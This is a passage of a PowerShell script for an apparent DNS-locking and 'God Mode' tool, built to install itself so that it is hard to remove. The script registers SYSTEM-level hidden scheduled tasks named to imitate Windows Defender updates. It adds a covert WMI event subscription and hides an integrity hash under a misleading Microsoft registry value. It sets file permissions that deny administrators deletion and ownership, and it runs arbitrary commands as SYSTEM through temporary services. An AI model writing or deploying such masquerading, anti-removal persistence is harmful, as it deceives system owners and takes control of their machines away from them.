        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        Set-Acl -Path $InstallDir -AclObject $DirAcl

        # Explicitly harden each file (directory inheritance may not cover existing files perfectly)
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        
        Write-Log -Message "Installation directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS permissions: $_" -Type "ERROR" -Color Red
    }
    # ----------------------------------------
    
    # 2. Build the Global CLI Command (dnslock) in C:\Windows (ASCII encoding, no BOM)
    Out-File -FilePath $CmdPath -InputObject $CmdBatContent -Encoding ASCII -Force
    if (-not (Test-Path $CmdPath)) {
        Write-Log -Message "CRITICAL: Wrapper file was not created at $CmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $CmdPath." -Type "SUCCESS" -Color Green
    }

    # 2.2 Add InstallDir to system PATH so dnslock is discoverable from any shell
    Write-Log -Message "Adding $InstallDir to system PATH..." -Type "INFO" -Color Yellow
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$InstallDir*") {
            $NewPath = $CurrentPath + ";" + $InstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $InstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$InstallDir already in system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update system PATH: $_" -Type "ERROR" -Color Red
    }

    # 2.3 Harden the wrapper files against tampering (but allow all users to execute them)
    Write-Log -Message "Hardening dnslock wrapper files..." -Type "INFO" -Color Yellow
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($CmdPath, $CmdPathLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked to SYSTEM (FullControl), Admins (ReadOnly+NoDelete), Users (ReadAndExecute)." -Type "SUCCESS" -Color Green

    Write-Log -Message "Registering self-healing background tasks..." -Type "INFO" -Color Yellow
    
    # 3. Triggers: Run at System Startup, User Logon, and Event ID 10000 (Network Connected)
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    
    $CimClass = Get-CimClass -ClassName MSFT_TaskEventTrigger -Namespace "Root/Microsoft/Windows/TaskScheduler"
    $Trigger3 = New-CimInstance -CimClass $CimClass -ClientOnly
    $Trigger3.Subscription = "<QueryList><Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'><Select Path='Microsoft-Windows-NetworkProfile/Operational'>*[System[EventID=10000]]</Select></Query></QueryList>"
    $Trigger3.Enabled = $True

    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2, $Trigger3) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Registered Scheduled Task: System will auto-heal locks on Reboot & Network Change." -Type "INFO" -Color Gray

    # 4. Guardian 1: Monitors every 5 minutes and restores if tampered
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GuardianTaskName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "Guardian 1 '$GuardianTaskName' registered (5-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.1 Guardian 2: Additional watcher with a 10-minute interval (attacker must kill both)
    $Guardian2Name = "Windows-Defender-AM-Updates"
    $Guardian2Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"
    $Guardian2Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 9999)
    $Guardian2Principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $Guardian2Name -Action $Guardian2Action -Trigger $Guardian2Trigger -Principal $Guardian2Principal -Force | Out-Null
    Write-Log -Message "Guardian 2 '$Guardian2Name' registered (10-minute heartbeat)." -Type "INFO" -Color Gray

    # 4.2 WMI Event Subscription: Third hidden persistence layer (harder to find than tasks)
    Write-Log -Message "Registering WMI event subscription for persistence..." -Type "INFO" -Color Gray
    try {
        $WmiQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_Service' AND TargetInstance.Name = 'Schedule'"
        $WmiConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$InstallScript`" -SilentLock"; RunInteractively=$false} -ErrorAction Stop
        $WmiFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="WindowsUpdateHealthCheck"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query=$WmiQuery} -ErrorAction Stop
        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WmiFilter; Consumer=$WmiConsumer} -ErrorAction Stop | Out-Null
        Write-Log -Message "WMI subscription registered (triggers if Schedule service is modified)." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "WMI subscription registration failed: $_" -Type "WARN" -Color Yellow
    }

    # 5. Self-Integrity: Store SHA256 hash in a misleading registry key (harder to tamper than a file)
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $IntegrityRegPath)) { New-Item -Path $IntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Self-integrity hash stored in registry (backup file already written)." -Type "INFO" -Color Gray

    Enable-DNSLock
    Write-Log -Message "INSTALLATION COMPLETE! System is permanently protected." -Type "SUCCESS" -Color Green

    # 6. GPO registry values are protection enough; skip ACL hardening to avoid gpupdate lock conflicts
    Write-Log -Message "GPO registry values enforced. Skipping ACL hardening to avoid gpupdate lock." -Type "INFO" -Color Gray

    # Final status verification
    $FailedCount = 0
    if (-not (Test-Path $InstallDir)) { $FailedCount++; Write-Log -Message "Install directory $InstallDir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $InstallScript)) { $FailedCount++; Write-Log -Message "Install script $InstallScript missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $CmdPath)) { $FailedCount++; Write-Log -Message "Global CLI wrapper $CmdPath missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $IntegrityFile)) { $FailedCount++; Write-Log -Message "Integrity file $IntegrityFile missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task $TaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 1 $GuardianTaskName missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian 2 $Guardian2Name missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH does not contain $InstallDir." -Type "ERROR" -Color Red }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiFilter) { Write-Log -Message "WMI event filter missing." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if (-not $WmiConsumer) { Write-Log -Message "WMI event consumer missing." -Type "WARN" -Color Yellow }
    Export-RawDebugDump -Trigger "DNS_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] INSTALLATION COMPLETE!" -ForegroundColor Green
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Success"
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
    }
}

function Invoke-AsSystem {
    param(
        [string]$Command,
        [int]$MaxWaitSeconds = 30
    )

    $TaskId = Get-Random -Minimum 10000 -Maximum 99999
    $CommonTemp = $env:TEMP
    Write-Log -Message "[Invoke-AsSystem] Starting service-based SYSTEM elevation (TaskId=$TaskId)." -Type "INFO" -Color Yellow

    # --- Method 1: Temporary Service (sc.exe) ---
    $ServiceName = "InvokeAsSystemSvc_$TaskId"
    $ResultFile2 = Join-Path $CommonTemp "InvokeAsSystem_SvcResult_$TaskId.txt"
    $BatchFile2 = Join-Path $CommonTemp "InvokeAsSystem_SvcBatch_$TaskId.cmd"

    $BatchContent2 = "@echo off`r`n$Command > `"$ResultFile2`" 2>&1`r`necho ___DONE___ >> `"$ResultFile2`""
    Set-Content -Path $BatchFile2 -Value $BatchContent2 -Encoding ASCII -Force

    try {
        Write-DebugLog -FunctionName "Invoke-AsSystem" -Action "INFO" -Message "Method 2: Temporary service $ServiceName"
        $scCreate = sc.exe create $ServiceName binPath= "cmd.exe /c `"$BatchFile2`"" start= demand
        if ($LASTEXITCODE -eq 0) {
            sc.exe start $ServiceName | Out-Null
            Start-Sleep -Seconds 2

            $waited = 0
            $success = $false
            while ($waited -lt $MaxWaitSeconds) {
                Start-Sleep -Seconds 1
                $waited++
                if (Test-Path $ResultFile2) {
                    $content = Get-Content -Path $ResultFile2 -Raw -ErrorAction SilentlyContinue
                    if ($content -and $content.Contains("___DONE___")) {
                        $output = ($content -replace "___DONE___", "").Trim()
                        $success = $true
                        break
                    }
                }
            }

            sc.exe stop $ServiceName | Out-Null
            sc.exe delete $ServiceName | Out-Null

            Remove-Item -Path $ResultFile2 -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $BatchFile2 -Force -ErrorAction SilentlyContinue

            if ($success) {
                Write-Log -Message "[Invoke-AsSystem] Temporary service method succeeded." -Type "INFO" -Color Green
                return [PSCustomObject]@{ Success = $true; Output = $output }
            } else {
                Write-Log -Message "[Invoke-AsSystem] Temporary service method did not produce result within timeout." -Type "WARN" -Color Yellow
            }
        } else {
            Write-Log -Message "[Invoke-AsSystem] Service creation failed (sc.exe exit code: $LASTEXITCODE). Output: $scCreate" -Type "WARN" -Color Yellow
        }
    } catch {
        Write-Log -Message "[Invoke-AsSystem] Service method exception: $_" -Type "WARN" -Color Yellow
    }

    # Cleanup Method 2 artifacts
    sc.exe stop $ServiceName | Out-Null
    sc.exe delete $ServiceName | Out-Null
    Remove-Item -Path $ResultFile2 -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $BatchFile2 -Force -ErrorAction SilentlyContinue

    # --- Method 3: Task Scheduler Fallback ---
    Write-Log -Message "[Invoke-AsSystem] Falling back to Task Scheduler method..." -Type "INFO" -Color Yellow

    $TempTaskName = "DNSGuard-Helper_$TaskId"
    $ResultFile3 = Join-Path $CommonTemp "DNSGuard_Result_$TaskId.txt"
    $BatchFile3 = Join-Path $CommonTemp "DNSGuard_Batch_$TaskId.cmd"

    try {
        # Ensure Task Scheduler service is running
        try {
            $schedService = Get-Service -Name "Schedule" -ErrorAction SilentlyContinue
            if ($schedService -and $schedService.Status -ne 'Running') {
                Start-Service -Name "Schedule" -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 1
            }
        } catch {}

        $BatchContent3 = @"
@echo off
cd /d $CommonTemp
$Command
if %errorlevel% equ 0 (
    echo ___SUCCESS___
) else (
    echo ___FAILED___
)
"@
        Set-Content -Path $BatchFile3 -Value $BatchContent3 -Encoding ASCII -Force
        $Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatchFile3`" > `"$ResultFile3`" 2>&1"
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $TempTaskName -Action $Action -Principal $Principal -Force | Out-Null
        Start-Sleep -Milliseconds 500
        Start-ScheduledTask -TaskName $TempTaskName
        $Waited = 0
        $Completed = $false
        $Success = $false
        while ($Waited -lt $MaxWaitSeconds) {
            Start-Sleep -Seconds 1
            $Waited++
            if (Test-Path $ResultFile3) {
                $ResultText = Get-Content -Path $ResultFile3 -Raw -ErrorAction SilentlyContinue
                if ($ResultText -and ($ResultText.Contains("___SUCCESS___") -or $ResultText.Contains("___FAILED___"))) {
                    $Completed = $true
                    $Success = $ResultText.Contains("___SUCCESS___")
                    break
                }
            }
        }
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        $Output = ""
        if (Test-Path $ResultFile3) {
            $ResultText = Get-Content -Path $ResultFile3 -Raw -ErrorAction SilentlyContinue
            $Output = ($ResultText -replace "___SUCCESS___", "" -replace "___FAILED___", "").Trim()
            Remove-Item -Path $ResultFile3 -Force -ErrorAction SilentlyContinue
        }
        Remove-Item -Path $BatchFile3 -Force -ErrorAction SilentlyContinue
        if ($Completed) {
            Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback completed. Success=$Success" -Type "INFO" -Color Yellow
            return [PSCustomObject]@{ Success = $Success; Output = $Output }
        } else {
            Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback timed out." -Type "ERROR" -Color Red
            return [PSCustomObject]@{ Success = $false; Output = $Output }
        }
    } catch {
        Write-Log -Message "[Invoke-AsSystem] Task Scheduler fallback failed: $_" -Type "ERROR" -Color Red
        Unregister-ScheduledTask -TaskName $TempTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        Remove-Item -Path $ResultFile3 -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $BatchFile3 -Force -ErrorAction SilentlyContinue
        return [PSCustomObject]@{ Success = $false; Output = "" }
    }
}

function Install-GodModePersistence {
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "ENTRY"
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_START"
    Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow

    # Gate: prevent overwrite
    if (Test-Path $GodModeInstallDir) {
        Write-Log -Message "Installation aborted: $GodModeInstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$GodModeTaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] God Mode is already installed. Uninstall first." -ForegroundColor Red
        return
    }

    # 1. Secure copy
    if (-not (Test-Path $GodModeInstallDir)) { New-Item -ItemType Directory -Path $GodModeInstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $GodModeInstallScript -Force
    Write-Log -Message "Payload copied to $GodModeInstallScript." -Type "INFO" -Color Gray

    # 1a. Copy driver folder (C sources) so scheduled tasks can build from the installed location
    $DriverSource = Join-Path $PSScriptRoot "driver"
    $DriverDest = Join-Path $GodModeInstallDir "driver"
    if (Test-Path $DriverSource) {
        try {
            Copy-Item -Path $DriverSource -Destination $DriverDest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Driver folder copied to $DriverDest." -Type "INFO" -Color Gray
        } catch {
            Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "WARN" -Message "Driver folder copy failed: $_"
        }
    }

    # 2. Build wrapper
    $WrapperContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" %*"
    $WrapperLocal = Join-Path $GodModeInstallDir "godmode.cmd"
    Out-File -FilePath $WrapperLocal -InputObject $WrapperContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $WrapperLocal." -Type "INFO" -Color Gray

    # 3. Integrity hash
    $ScriptHash = (Get-FileHash -Path $GodModeInstallScript -Algorithm SHA256).Hash
    $GodModeIntegrityFile = Join-Path $GodModeInstallDir "integrity.sha256"
    Set-Content -Path $GodModeIntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash written." -Type "INFO" -Color Gray

    # 4. NTFS hardening
    Write-Log -Message "Hardening NTFS on God Mode directory..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        $DirAcl = Get-Acl -Path $GodModeInstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        Set-Acl -Path $GodModeInstallDir -AclObject $DirAcl
        Get-ChildItem -Path $GodModeInstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetAccessRuleProtection($true, $false)
            $FileAcl.Access | ForEach-Object { $FileAcl.RemoveAccessRule($_) | Out-Null }
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
            $FileAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }
        Write-Log -Message "God Mode directory and files locked. Owner=SYSTEM, Admins=ReadOnly+NoDelete." -Type "SUCCESS" -Color Green
    } catch {
        Write-Log -Message "Failed to harden NTFS: $_" -Type "ERROR" -Color Red
    }

    # 5. Global CLI
    Out-File -FilePath $GodModeCmdPath -InputObject $WrapperContent -Encoding ASCII -Force
    if (-not (Test-Path $GodModeCmdPath)) {
        Write-Log -Message "CRITICAL: godmode wrapper not created at $GodModeCmdPath!" -Type "ERROR" -Color Red
    } else {
        Write-Log -Message "Global CLI wrapper created at $GodModeCmdPath." -Type "SUCCESS" -Color Green
    }

    # 6. PATH
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -notlike "*$GodModeInstallDir*") {
            $NewPath = $CurrentPath + ";" + $GodModeInstallDir
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Added $GodModeInstallDir to system PATH." -Type "SUCCESS" -Color Green
        } else {
            Write-Log -Message "$GodModeInstallDir already in PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to update PATH: $_" -Type "ERROR" -Color Red
    }

    # 7. Harden wrapper
    $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")
    foreach ($WrapperPath in @($GodModeCmdPath, $WrapperLocal)) {
        if (Test-Path $WrapperPath) {
            try {
                $CmdAcl = Get-Acl -Path $WrapperPath
                $CmdAcl.SetOwner($SidSystem)
                $CmdAcl.SetAccessRuleProtection($true, $false)
                $CmdAcl.Access | ForEach-Object { $CmdAcl.RemoveAccessRule($_) | Out-Null }
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "None", "None", "Allow")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "Delete", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "TakeOwnership", "None", "None", "Deny")))
                $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidUsers, "ReadAndExecute", "None", "None", "Allow")))
                Set-Acl -Path $WrapperPath -AclObject $CmdAcl
            } catch {
                Write-Log -Message "Failed to harden wrapper ACLs for $WrapperPath`: $_" -Type "ERROR" -Color Red
            }
        }
    }
    Write-Log -Message "Wrapper files locked." -Type "SUCCESS" -Color Green

    # 8. Main task: auto-enable God Mode at logon if flag exists
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -AtLogOn
    $PrincipalSettings = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeTaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $PrincipalSettings -Force | Out-Null
    Write-Log -Message "Main God Mode task registered." -Type "INFO" -Color Gray

    # 9. Guardian: re-apply every 5 minutes if flag exists
    $GuardianAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
    $GuardianTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
    $GuardianPrincipal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $GodModeGuardianName -Action $GuardianAction -Trigger $GuardianTrigger -Principal $GuardianPrincipal -Force | Out-Null
    Write-Log -Message "God Mode guardian registered (5-min heartbeat)." -Type "INFO" -Color Gray

    # 10. Integrity in registry (misleading key)
    $GodModeIntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (-not (Test-Path $GodModeIntegrityRegPath)) { New-Item -Path $GodModeIntegrityRegPath -Force | Out-Null }
    Set-ItemProperty -Path $GodModeIntegrityRegPath -Name "PushConfigBackoffInterval" -Value $ScriptHash -Force -ErrorAction SilentlyContinue
    Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray

    Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green
    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "EXIT" -Message "Success"

    # Final verification
    $FailedCount = 0
    if (-not (Test-Path $GodModeInstallDir)) { $FailedCount++; Write-Log -Message "Install dir missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeInstallScript)) { $FailedCount++; Write-Log -Message "Install script missing." -Type "ERROR" -Color Red }
    if (-not (Test-Path $GodModeCmdPath)) { $FailedCount++; Write-Log -Message "Global CLI missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Main task missing." -Type "ERROR" -Color Red }
    if (-not (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue)) { $FailedCount++; Write-Log -Message "Guardian missing." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -notlike "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH missing." -Type "ERROR" -Color Red }
    Export-RawDebugDump -Trigger "GODMODE_INSTALL_END"
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] GOD MODE INSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
    }
}

function Uninstall-GodModePersistence {
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "ENTRY"
    $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling God Mode from System..." -Type "ACTION" -Color Yellow
    Disable-GodMode

